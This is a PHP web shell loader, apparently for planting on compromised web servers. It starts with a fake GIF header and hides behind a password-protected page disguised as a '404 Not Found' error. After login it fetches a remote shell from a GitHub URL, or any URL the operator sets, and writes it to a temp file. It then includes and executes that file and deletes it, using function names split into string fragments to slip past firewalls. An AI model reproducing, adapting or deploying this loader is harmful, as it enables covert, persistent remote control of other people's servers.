GIF89;a

<?php
session_start();

$AUTH_HASH = '$2y$12$9c8K1r8m3Qy7n5v2x8w4eO0p3s6u9y2b5d8g1j4l7o0q3t6w9z2c5f8h1k';
$MAX_ATTEMPTS = 3;
$LOCKOUT_TIME = 300;

if (isset($_SESSION['locked_until']) && time() < $_SESSION['locked_until']) {
    http_response_code(403);
    die('Forbidden');
}

if (!isset($_SESSION['auth_ok']) || $_SESSION['auth_ok'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['auth_pass'])) {
        if (password_verify($_POST['auth_pass'], $AUTH_HASH)) {
            $_SESSION['auth_ok'] = true;
            $_SESSION['attempts'] = 0;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit();
        } else {
            $_SESSION['attempts'] = ($_SESSION['attempts'] ?? 0) + 1;
            if ($_SESSION['attempts'] >= $MAX_ATTEMPTS) {
                $_SESSION['locked_until'] = time() + $LOCKOUT_TIME;
                $_SESSION['attempts'] = 0;
                http_response_code(403);
                die('Forbidden');
            }
            $error = true;
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>404 Not Found</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                background: #f1f1f1;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .box {
                background: #fff;
                padding: 40px;
                border-radius: 4px;
                box-shadow: 0 1px 3px rgba(0,0,0,0.1);
                max-width: 400px;
                width: 100%;
            }
            h1 { font-size: 24px; color: #444; margin-bottom: 20px; font-weight: 500; }
            p { color: #666; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
            input[type="password"] {
                width: 100%;
                padding: 10px;
                border: 1px solid #ddd;
                border-radius: 4px;
                font-size: 14px;
                margin-bottom: 15px;
            }
            button {
                background: #0073aa;
                color: #fff;
                border: none;
                padding: 10px 20px;
                border-radius: 4px;
                cursor: pointer;
                font-size: 14px;
            }
            button:hover { background: #005a87; }
            .err { color: #dc3232; font-size: 13px; margin-bottom: 15px; }
        </style>
    </head>
    <body>
        <div class="box">
            <h1>Not Found</h1>
            <p>The requested URL was not found on this server.</p>
            <?php if (isset($error)): ?>
                <p class="err">Invalid request.</p>
            <?php endif; ?>
            <form method="post" autocomplete="off">
                <input type="password" name="auth_pass" placeholder="Authentication key" required autofocus>
                <button type="submit">Continue</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit();
}

// CODED BY MADEXPLOITS
// BYPASS ALL WAF
// PROTECTION TO LITESPEED WAF
// Github : www.github.com/MadExploits

error_reporting(0);

$important_url = 'https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-new.php';

if (isset($_GET['resetsh'])) {
    @session_start();
    @session_unset();
    @session_destroy();
    setcookie("url", "", time() - 3600, "/");
    $self = $_SERVER['PHP_SELF'];
    header("Location: $self");
    exit();
}

$b = ['s' => "s" . "et" . "co" . "ok" . "ie"];

if (isset($_COOKIE['url'])) {
    $url = $_COOKIE['url'];
} else {
    $url = $important_url;
    $b['s']("url", $url, time() + (365 * 24 * 60 * 60), "/");
}

if (isset($_POST['setsh'])) {
    $newUrl = trim($_POST['setsh']);
    if (!empty($newUrl)) {
        $b['s']("url", $newUrl, time() + (365 * 24 * 60 * 60), "/");
        $url = $newUrl;
    }
}

$a = [
    'u' => $url,
    'tf' => "t" . "em" . "pn" . "am",
    'td' => "s" . "ys" . "_g" . "et" . "_t" . "em" . "p_" . "di" . "r",
    'fp' => "fi" . "le" . "_p" . "ut" . "_c" . "on" . "te" . "nt" . "s",
    'fg' => "fi" . "le" . "_g" . "et" . "_c" . "on" . "te" . "nt" . "s",
    'un' => "un" . "li" . "nk",
];
?>
<style>
    body {
        margin: 0 !important;
        font-family: monospace !important;
        background: #0d1117 !important;
        color: #c9d1d9 !important;
    }

    .navbar {
        position: fixed !important;
        top: 0 !important;
        left: 0 !important;
        width: 100% !important;
        background: #0d1117 !important;
        padding: 10px 20px !important;
        z-index: 10000 !important;
        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5) !important;
        display: flex !important;
        justify-content: flex-start !important;
        align-items: center !important;
    }

    .hamburger {
        display: flex !important;
        flex-direction: column !important;
        cursor: pointer !important;
        gap: 4px !important;
        transition: all 0.3s ease !important;
    }

    .hamburger div {
        width: 25px !important;
        height: 3px !important;
        background: #c9d1d9 !important;
        border-radius: 2px !important;
        transition: all 0.3s ease !important;
    }

    .hamburger.active div:nth-child(1) {
        transform: rotate(45deg) translate(5px, 5px) !important;
    }

    .hamburger.active div:nth-child(2) {
        opacity: 0 !important;
    }

    .hamburger.active div:nth-child(3) {
        transform: rotate(-45deg) translate(5px, -5px) !important;
    }

    .nav-menu {
        max-height: 0 !important;
        overflow: hidden !important;
        opacity: 0 !important;
        display: flex;
        flex-direction: column !important;
        gap: 10px !important;
        background: #161b22 !important;
        padding: 0 15px !important;
        margin-top: 10px !important;
        border-radius: 8px !important;
        transition: all 0.3s ease !important;
        position: absolute !important;
        top: 50px !important;
        left: 10px !important;
        width: 280px !important;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3) !important;
    }

    .nav-menu.active {
        max-height: 500px !important;
        opacity: 1 !important;
        padding: 15px !important;
    }

    .nav-menu b {
        font-weight: 500 !important;
        margin-bottom: 8px !important;
        display: block !important;
        word-wrap: break-word;
    }

    .nav-menu input {
        padding: 8px 10px !important;
        border-radius: 5px !important;
        border: 1px solid #30363d !important;
        background: #0d1117 !important;
        color: #c9d1d9 !important;
        outline: none !important;
        width: 100% !important;
        box-sizing: border-box;
        transition: all 0.2s ease !important;
    }

    .nav-menu input:focus {
        border-color: #58a6ff !important;
    }

    .nav-menu button,
    .nav-menu a {
        padding: 8px 12px !important;
        border-radius: 5px !important;
        border: none !important;
        font-weight: 500 !important;
        cursor: pointer !important;
        text-align: center !important;
        text-decoration: none !important;
        color: #fff !important;
        display: block;
        box-sizing: border-box;
        transition: all 0.2s ease !important;
    }

    .nav-menu button {
        background: linear-gradient(90deg, #238636, #2ea043) !important;
        width: 100%;
    }

    .nav-menu button:hover {
        background: linear-gradient(90deg, #2ea043, #238636) !important;
    }

    .nav-menu a {
        background: #ca4037 !important;
    }

    .nav-menu a:hover {
        background: #f85149 !important;
    }

    .spacer {
        height: 70px !important;
    }
</style>
<div class="navbar">
    <div class="hamburger" onclick="this.classList.toggle('active'); document.querySelector('.nav-menu').classList.toggle('active')">
        <div></div>
        <div></div>
        <div></div>
    </div>
</div>
<div class="nav-menu">
    <b>Current: <?php echo htmlspecialchars($url); ?></b>
    <form method="post">
        <input type="text" name="setsh" placeholder="New Shell URL" value="<?php echo htmlspecialchars($url); ?>">
        <button type="submit">Set URL</button>
    </form>
    <a href="?resetsh=1">Reset URL</a>
</div>
<div class="spacer"></div>
<?php
$tmp = @$a['tf'](@$a['td'](), "_ME");
if ($tmp && @$a['fp']($tmp, @$a['fg']($a['u']))) {
    include $tmp;
    @$a['un']($tmp);
} else {
    echo "<center><h1>Failed to load shell from URL.</h1></center>";
}
?>